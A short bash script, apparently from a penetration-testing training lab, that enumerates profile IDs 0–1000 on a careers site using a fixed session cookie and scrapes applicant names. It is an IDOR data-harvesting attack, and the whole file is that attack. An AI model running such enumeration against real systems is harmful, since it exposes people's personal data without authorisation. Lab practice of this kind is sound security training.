#!/bin/bash

for i in {0..1000}; do

    r=$(curl -s "http://careers.inlanefreight.local/profile?id=${i}" --cookie \
    'session=eyJsb2dnZWRfaW4iOnRydWV9.ZEKY3Q.4_XeNiysCbUXBj6wlGfxg_YaXso' \
    | grep -Pio 'applied by .*<'\
    | sed 's/applied by //g'\
    | sed 's/<$//g')


    echo "${i} ${r}"

done